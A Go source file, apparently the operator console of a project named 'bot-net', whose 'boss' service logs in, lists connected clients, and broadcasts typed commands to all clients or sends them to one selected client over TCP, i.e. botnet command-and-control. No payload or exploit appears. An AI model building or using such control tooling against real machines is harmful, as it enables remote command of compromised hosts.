package cli

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/bot-net/boss/service/tcp"
	"github.com/phanletrunghieu/bot-net/common/cmd"
)

// ExecuteMain .
func ExecuteMain(bossService *tcp.Service) {
	for {
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading input", err)
			continue
		}

		text = strings.TrimSpace(text)
		cmdArr := strings.Split(text, " ")

		if len(cmdArr) <= 0 {
			fmt.Println("[ERROR] reading input")
			continue
		}

		switch cmdArr[0] {
		case "login":
			if len(cmdArr) > 2 {
				bossService.WriteChan <- (cmdArr[1] + " " + cmdArr[2])
			}
			break
		case "list":
			if len(cmdArr) > 1 && cmdArr[1] == "clients" {
				bossService.WriteChan <- cmd.ListClients
			}
			break
		case "use":
			if len(cmdArr) > 1 {
				clientID := cmdArr[1]
				executeClient(clientID, bossService)
			}
			break
		default:
			bossService.WriteChan <- (cmd.Broadcast + text)
		}
	}
}

func executeClient(clientID string, bossService *tcp.Service) {
	for {
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading input", err)
			continue
		}

		text = strings.TrimSpace(text)
		cmdArr := strings.Split(text, " ")

		if len(cmdArr) <= 0 {
			fmt.Println("[ERROR] reading input")
			continue
		}

		switch cmdArr[0] {
		case "exit":
			return
		default:
			cID, err := uuid.FromString(clientID)
			if err != nil {
				fmt.Println("[ERROR] invalid client")
				continue
			}
			bossService.WriteChan <- (cmd.UseClient + string(cID.Bytes()) + text)
		}
	}
}
